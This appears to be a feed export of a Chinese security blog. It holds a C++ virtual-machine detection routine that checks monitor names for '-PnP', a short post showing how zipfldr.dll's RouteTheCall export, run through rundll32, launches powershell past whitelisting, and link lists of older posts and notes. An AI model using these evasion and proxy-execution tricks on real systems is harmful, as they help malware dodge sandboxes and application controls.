<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">in_vm</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DISPLAY_DEVICE dd;</span><br><span class="line">    dd.cb = <span class="keyword">sizeof</span>(dd);</span><br><span class="line">    DWORD dev_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">wchar_t</span> dev_name[<span class="number">32</span>];</span><br><span class="line">    <span class="comment">// 遍历显示设备</span></span><br><span class="line">    <span class="keyword">while</span> (EnumDisplayDevicesW(<span class="literal">NULL</span>, dev_index, &amp;dd, DISPLAY_DEVICE_ATTACHED_TO_DESKTOP)) &#123;</span><br><span class="line">        wcsncpy(dev_name, dd.DeviceName, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历监视器</span></span><br><span class="line">        DWORD monitor_index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (EnumDisplayDevicesW(dev_name, monitor_index, &amp;dd, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">// 查找特征&quot;-PnP&quot;</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">wstring</span> name = dd.DeviceString;</span><br><span class="line">            <span class="keyword">if</span> (name.find(<span class="string">L&quot;-PnP&quot;</span>) != <span class="built_in">std</span>::<span class="built_in">wstring</span>::npos) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            monitor_index++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dev_index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>攻防相关</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>白名单之zipfldr.dll利用</title>
    <url>/2021/02/19/%E7%99%BD%E5%90%8D%E5%8D%95%E4%B9%8Bzipfldr-dll%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="zipfldr-dll"><a href="#zipfldr-dll" class="headerlink" title="zipfldr.dll"></a>zipfldr.dll</h2><p>windows自带的zip压缩组件中存在一个<code>zipfldr.dll</code>，可以被利用</p>
<a id="more"></a>

<p>此dll位于<code>C:\Windows\System32</code>或<code>C:\Windows\SysWow64</code>下，且存在一个导出函数<code>RouteTheCall</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">RouteTheCall</span><span class="params">(HWND a1, HINSTANCE a2, <span class="keyword">const</span> <span class="keyword">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  WCHAR pwszDst[<span class="number">264</span>]; <span class="comment">// [rsp+30h] [rbp-228h] BYREF</span></span><br><span class="line"></span><br><span class="line">  SHAnsiToUnicode(a3, pwszDst, <span class="number">260</span>);</span><br><span class="line">  PathRemoveBlanksW(pwszDst);</span><br><span class="line">  ShellExecuteW(<span class="number">0</span>i64, <span class="number">0</span>i64, pwszDst, <span class="number">0</span>i64, <span class="number">0</span>i64, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到此函数调用<code>ShellExecuteW</code>来执行传入的参数所指向的程序</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>由于此程序为DLL，则需要使用<code>rundll32.exe</code>来执行，如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">rundll32</span> <span class="selector-tag">zipfldr</span><span class="selector-class">.dll</span>, <span class="selector-tag">RouteTheCall</span> <span class="selector-tag">powershell</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>攻防相关</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>旧博客文章合集</title>
    <url>/2021/02/01/%E6%97%A7%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p>旧博客文章合集，包括windows内核、攻防、漏洞分析、其他等内容</p>
<a id="more"></a>



<h2 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h2><ul>
<li><p><a href="http://lzeroyuee.cn/old-blog/Windows%E9%A9%B1%E5%8A%A8%E6%A1%86%E6%9E%B6%20-%20lZeroyuee's%20Blog.html">Windows驱动框架</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/Windows%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E7%9A%84%E8%A3%85%E8%BD%BD%20-%20lZeroyuee's%20Blog.html">Windows内核驱动的装载</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/%E5%88%86%E6%9E%90PsSetCreateProcessNotifyRoutineEx%E5%AF%BB%E6%89%BE%E7%9B%B8%E5%BA%94%E7%B3%BB%E7%BB%9F%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%20-%20lZeroyuee's%20Blog.html">分析PsSetCreateProcessNotifyRoutineEx寻找相应系统回调函数地址</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/%E5%9C%A8x86%E4%B8%8B%E5%86%99x64%E4%BB%A3%E7%A0%81%E4%BB%A5%E6%89%B0%E4%B9%B1%E8%B0%83%E8%AF%95%E5%99%A8%20-%20lZeroyuee's%20Blog.html">在x86下写x64代码以扰乱调试器</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/x64%E5%86%85%E6%A0%B8%EF%BC%9A%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%20-%20lZeroyuee's%20Blog.html">x64内核：过滤驱动</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/x64%E5%86%85%E6%A0%B8%EF%BC%9A%E6%B3%A8%E5%86%8C%E7%B3%BB%E7%BB%9F%E5%9B%9E%E8%B0%83%20-%20lZeroyuee's%20Blog.html">x64内核：注册系统回调</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/x64%E5%88%86%E9%A1%B5%20-%20%E8%8E%B7%E5%8F%96PTE%E5%9F%BA%E5%9D%80%20-%20lZeroyuee's%20Blog.html">x64分页 - 获取PTE基址</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/SMEP%E5%92%8CSMAP%20-%20lZeroyuee's%20Blog.html">SMEP和SMAP</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/%E5%86%85%E6%A0%B8%E9%A1%B5%E8%A1%A8%E9%9A%94%E7%A6%BB%E4%B8%8ECFG%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%20-%20lZeroyuee's%20Blog.html">内核页表隔离与CFG防御机制</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/%E5%88%9D%E8%AF%86win32%E5%A0%86%20-%20lZeroyuee's%20Blog.html">初识win32堆</a></p>
</li>
</ul>
<h2 id="攻防"><a href="#攻防" class="headerlink" title="攻防"></a>攻防</h2><ul>
<li><p><a href="http://lzeroyuee.cn/old-blog/Detours%E5%85%A5%E9%97%A8%20-%20lZeroyuee's%20Blog.html">Detours入门</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/Frida%E5%B0%8F%E8%AF%95%20-%20lZeroyuee's%20Blog.html">Frida小试</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/yara%E8%A7%84%E5%88%99%E5%B0%8F%E8%AE%B0%20-%20lZeroyuee's%20Blog.html">yara规则小记</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/%E4%BD%BF%E7%94%A8idapython%E8%84%9A%E6%9C%AC%E8%A7%A3%E7%A0%81%E6%A0%B7%E6%9C%AC%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%20-%20lZeroyuee's%20Blog.html">使用idapython脚本解码样本中的字符串</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/Clipboard%E6%B3%A8%E5%85%A5%20-%20lZeroyuee's%20Blog.html">Clipboard注入</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%80%BB%E7%BB%93%20-%20lZeroyuee's%20Blog.html">反调试总结</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/RC4%20%E7%AE%97%E6%B3%95%20-%20lZeroyuee's%20Blog.html">RC4 算法</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/Shellcode%20to%20UUID%20-%20lZeroyuee's%20Blog.html">Shellcode to UUID</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/TLS%E5%9B%9E%E8%B0%83%20-%20lZeroyuee's%20Blog.html">TLS回调</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%20-%20lZeroyuee's%20Blog.html">SSH端口转发</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/%E5%AE%89%E8%A3%85proxychains-ng%E9%85%8D%E5%90%88ssr%E4%BB%A3%E7%90%86%20-%20lZeroyuee's%20Blog.html">安装proxychains-ng配合ssr代理</a></p>
</li>
</ul>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul>
<li><p><a href="http://lzeroyuee.cn/old-blog/CVE-2010-2883%E5%88%86%E6%9E%90%20-%20lZeroyuee's%20Blog.html">CVE-2010-2883分析</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/CVE-2012-1876%E5%88%86%E6%9E%90%20-%20lZeroyuee's%20Blog.html">CVE-2012-1876分析</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/CVE-2020-0787%E5%88%86%E6%9E%90%20-%20lZeroyuee's%20Blog.html">CVE-2020-0787分析</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/Win10%20ConDrv-BSOD%20-%20lZeroyuee's%20Blog.html">Win10 ConDrv-BSOD</a></p>
</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><p><a href="http://lzeroyuee.cn/old-blog/%E5%85%B3%E4%BA%8E%E6%9F%90%E5%85%AC%E5%8F%B8%E9%9D%A2%E8%AF%95%E7%9A%84%E6%A0%B7%E6%9C%AC%20-%20lZeroyuee's%20Blog.html">关于某公司面试的样本</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/%E5%85%B3%E4%BA%8ESB360.exe%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%20-%20lZeroyuee's%20Blog.html">关于SB360.exe的样本分析</a></p>
</li>
<li><p><a href="http://lzeroyuee.cn/old-blog/%E6%9F%90%E5%8E%82APT%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%B8%88%E7%9A%84%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93%20-%20lZeroyuee's%20Blog.html">某厂APT样本分析师的面试总结</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>过去</category>
      </categories>
      <tags>
        <tag>过去</tag>
      </tags>
  </entry>
  <entry>
    <title>早期个人笔记</title>
    <url>/2021/02/01/%E6%97%A9%E6%9C%9F%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>早期笔记，包括入门、开发、逆向三部分</p>
<a id="more"></a>

<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E6%89%8B%E5%B7%A5%E7%BC%96%E8%AF%91%E9%93%BE%E6%8E%A5.pdf">手工编译链接</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E8%B0%83%E8%AF%95.pdf">调试</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E9%A2%84%E5%A4%84%E7%90%86%E5%92%8C%E5%A4%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.pdf">预处理和头文件包含</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E5%8F%98%E9%87%8F%E7%B1%BB%E5%88%AB%E5%92%8C%E7%BC%96%E8%AF%91%E9%A2%84%E5%A4%84%E7%90%86.pdf">变量类别和编译预处理</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E8%A1%A5%E7%A0%81%E3%80%81%E6%B5%AE%E7%82%B9%E8%A1%A8%E7%A4%BA%E4%B8%8Eswitch%E5%88%86%E6%94%AF.pdf">补码、浮点表示与switch分支</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E5%AD%97%E7%AC%A6%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2.pdf">字符与字符串</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E6%95%B0%E7%BB%84.pdf">数组</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E5%8A%A0%E5%AF%86%E7%AD%96%E7%95%A5%E3%80%81%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84.pdf">加密策略、二维数组</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E4%B9%89%E4%B8%8E%E6%B1%87%E7%BC%96%E8%AF%AD%E4%B9%89%E3%80%81%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8.pdf">循环语义与汇编语义、函数调用</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E4%BC%98%E5%8C%96%E3%80%81%E5%8F%96%E6%95%B4%E3%80%81%E5%BE%AA%E7%8E%AF.pdf">优化、取整、循环</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0%E3%80%81%E7%BB%93%E6%9E%84%E4%BD%93.pdf">命令行参数、结构体</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E5%85%B1%E7%94%A8%E4%BD%93%E3%80%81%E6%9E%9A%E4%B8%BE.pdf">共用体、枚举</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E3%80%81%E4%BD%8D%E6%AE%B5%E3%80%81%E6%96%87%E4%BB%B6.pdf">位运算、位段、文件</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E5%A0%86.pdf">堆</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80.pdf">内存布局</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E6%8C%87%E9%92%881.pdf">指针1</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E6%8C%87%E9%92%882.pdf">指针2</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E6%8C%87%E9%92%883.pdf">指针3</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E6%8C%87%E9%92%884.pdf">指针4</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C/%E9%80%92%E5%BD%92.pdf">递归</a></p>
<h3 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/const%E6%88%90%E5%91%98%E5%87%BD%E6%95%B0%E3%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%88%97%E8%A1%A8%E3%80%81static%E6%88%90%E5%91%98.pdf">const成员函数、初始化列表、static成员</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/lambda%E3%80%81friend%E3%80%81%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD.pdf">lambda、friend、运算符重载</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/new%E4%B8%8Edelete%E7%9A%84%E8%A1%A5%E5%85%85%E3%80%81%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0.pdf">new与delete的补充、拷贝构造</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/volaitle%E3%80%81namespace%E3%80%81C%2B%2B11%E7%9A%84auto%E5%92%8Cdecltype.pdf">volaitle、namespace、C++11的auto和decltype</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E5%87%BD%E6%95%B0%E9%87%8D%E8%BD%BD%E3%80%81assert%E6%96%AD%E8%A8%80.pdf">函数重载、assert断言</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E5%90%8D%E7%A7%B0%E7%B2%89%E7%A2%8E%E8%A7%84%E5%BE%8B.pdf">名称粉碎规律</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E5%B8%83%E5%B0%94%E3%80%81const%E4%BF%AE%E9%A5%B0.pdf">布尔、const修饰</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E3%80%81%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF%E5%92%8C%E8%99%9A%E7%BB%A7%E6%89%BF.pdf">抽象类、多重继承和虚继承</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E6%9E%84%E9%80%A0%E6%9E%90%E6%9E%84%E3%80%81new%E4%B8%8Edelete.pdf">构造析构、new与delete</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E6%9E%9A%E4%B8%BE%E7%B1%BB%E3%80%81%E5%8E%9F%E5%A7%8B%E5%AD%97%E7%AC%A6%E4%B8%B2.pdf">枚举类、原始字符串</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E6%A8%A1%E6%9D%BF%E3%80%81%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0%E4%B8%8E%E8%B5%8B%E5%80%BC%E8%BF%90%E7%AE%97%E7%9A%84%E5%8C%BA%E5%88%AB.pdf">模板、拷贝构造与赋值运算的区别</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E6%A8%A1%E6%9D%BF%EF%BC%88%E8%A1%A5%EF%BC%89%E3%80%81%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88%E3%80%81%E5%BC%82%E5%B8%B8.pdf">模板（补）、智能指针、异常</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E7%B1%BB.pdf">类</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E7%BB%A7%E6%89%BF.pdf">继承</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E7%BB%A7%E6%89%BF%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83.pdf">继承中的对象内存分布</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E8%99%9A%E5%87%BD%E6%95%B0.pdf">虚函数</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E8%99%9A%E5%87%BD%E6%95%B0%EF%BC%88%E8%A1%A5%EF%BC%89%E3%80%81%E7%BB%A7%E6%89%BF%E4%B8%8E%E7%BB%84%E5%90%88.pdf">虚函数（补）、继承与组合</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0%E3%80%81%E5%BC%95%E7%94%A8%E3%80%81%E5%86%85%E8%81%94.pdf">默认参数、引用、内联</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/C%2B%2B/bind.pdf">bind</a></p>
<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6.pdf">时间复杂度</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84.pdf">动态数组</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97.pdf">栈、队列</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91.pdf">树</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E5%88%A0%E9%99%A4.pdf">二叉搜索树的删除</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91(AVL).pdf">平衡二叉树(AVL)</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%93%88%E5%B8%8C%E8%A1%A8.pdf">哈希表</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/first/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%B5%8C%E5%A5%97%E7%B1%BB%E3%80%81%E8%BF%AD%E4%BB%A3%E5%99%A8.pdf">嵌套类、迭代器</a></p>
<h2 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h2><h3 id="Windows编程"><a href="#Windows编程" class="headerlink" title="Windows编程"></a>Windows编程</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/SDK/SDK.pdf">SDK</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/SDK/%E7%AA%97%E5%8F%A3%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E9%94%80%E6%AF%81.pdf">窗口的创建和销毁</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/SDK/TranslateMessage%E3%80%81CLOSE%E5%92%8CDESTROY%E3%80%81GetAsyncKeyState%E5%92%8CGetKeyState.pdf">TranslateMessage、CLOSE和DESTROY、GetAsyncKeyState和GetKeyState</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/SDK/%E5%8F%B3%E9%94%AE%E5%BC%B9%E5%87%BA%E8%8F%9C%E5%8D%95.pdf">右键弹出菜单</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/SDK/%E7%BB%98%E5%9B%BE%E4%B8%8E%E9%94%AE%E7%9B%98%E6%B6%88%E6%81%AF.pdf">绘图与键盘消息</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/SDK/%E8%B5%84%E6%BA%90%E4%B8%8E%E5%AF%B9%E8%AF%9D%E6%A1%86.pdf">资源与对话框</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/Hook%E9%92%A9%E5%AD%90.pdf">Hook钩子</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/INI%E6%96%87%E4%BB%B6%E5%92%8C%E6%B3%A8%E5%86%8C%E8%A1%A8.pdf">INI文件和注册表</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E3%80%81def%E5%AF%BC%E5%87%BA.pdf">动态加载、def导出</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E3%80%81def%E5%AF%BC%E5%87%BA%E3%80%81DllMain%E3%80%81DLL%E5%8A%AB%E6%8C%81.pdf">动态加载、def导出、DllMain、DLL劫持</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E5%8F%A5%E6%9F%84%E5%92%8C%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%20%E2%80%94%20%E6%B6%88%E6%81%AF%E3%80%81%E5%85%B1%E4%BA%AB%E6%AE%B5.pdf">句柄和进程间通信 — 消息、共享段</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E5%A4%9A%E7%BA%BF%E7%A8%8B.pdf">多线程</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C.pdf">文件操作</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E6%A8%A1%E6%8B%9F%E9%BC%A0%E6%A0%87%E9%94%AE%E7%9B%98%E6%93%8D%E4%BD%9C.pdf">模拟鼠标键盘操作</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5.pdf">线程的同步</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E8%BF%9B%E7%A8%8B%E5%88%9B%E5%BB%BA%E3%80%81%E8%BF%9B%E7%A8%8B%E9%80%80%E5%87%BA%E3%80%81%E6%B3%A8%E5%86%8C%E8%A1%A8.pdf">进程创建、进程退出、注册表</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86%E3%80%81%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%9A%84%E6%93%8D%E4%BD%9C.pdf">进程遍历、进程间的操作</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%20%E2%80%94%20%E7%AE%A1%E9%81%93.pdf">进程通信 — 管道</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%20%E2%80%94%20%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84.pdf">进程间通信 — 文件映射</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5.pdf">远程线程注入</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/Windows%E7%BC%96%E7%A8%8B/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93.pdf">静态库和动态库</a></p>
<h3 id="MFC-amp-QT"><a href="#MFC-amp-QT" class="headerlink" title="MFC &amp; QT"></a>MFC &amp; QT</h3><p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/MFC%E7%AE%80%E4%BB%8B.pdf">MFC简介</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/MFC%E5%85%A5%E5%8F%A3%E5%88%86%E6%9E%90(%E5%8D%95%E6%96%87%E6%A1%A3).pdf">MFC入口分析(单文档)</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/MFC%E6%B6%88%E6%81%AF.pdf">MFC消息</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/MFC%E5%92%8CQT%E7%9A%84%E5%AD%90%E7%B1%BB%E5%8C%96%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%8E%A7%E4%BB%B6.pdf">MFC和QT的子类化与常用控件</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/DDX.pdf">DDX</a></p>
<p><a href="https://github.com/l0yuee/NotesOn51asm/blob/master/second/MFC%26QT/MFC%E7%9A%84DDX%E3%80%81QT%E7%9A%84%E4%BF%A1%E5%8F%B7%E6%A7%BD.pdf">MFC的DDX、QT的信号槽</a></p>
